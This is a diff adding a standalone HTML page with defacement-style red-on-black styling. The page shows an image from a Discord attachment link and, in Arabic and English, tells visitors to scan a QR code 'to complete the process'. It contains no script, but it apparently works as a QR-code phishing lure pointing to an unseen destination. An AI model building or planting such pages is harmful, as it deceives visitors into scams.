@@ -1,0 +1,60 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        #content {
+            display: none; 
+            opacity: 0; 
+            transition: opacity 2s ease; 
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #ff0000; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #ff0000; 
+            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #1900ff; 
+            text-shadow: 0px 0px 8px #0004ff, 0px 0px 15px #0004ff, 0px 0px 25px #0004ff; 
+             letter-spacing: 4.5px; 
+        }
+        .gif-container img {
+            width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div id="content" style="display: block; opacity: 1;">
+        <div class="image-container">
+            <img src="https://cdn.discordapp.com/attachments/1339519458217168906/1343016278096478238/download_3.png?ex=67bbbce0&is=67ba6b60&hm=b4fe0a8946fcb2349fc9ec6c9b3b763f5e29eaa29cdecb25d28ab6eb6427142b&">
+        </div>
+        <div class="text">لإكمال العملية ، الرجاء مسح الباركود</div>
+        <div class="text">To complete the process, please scan the qrcode.</div>
+    </div>
+</body></html>
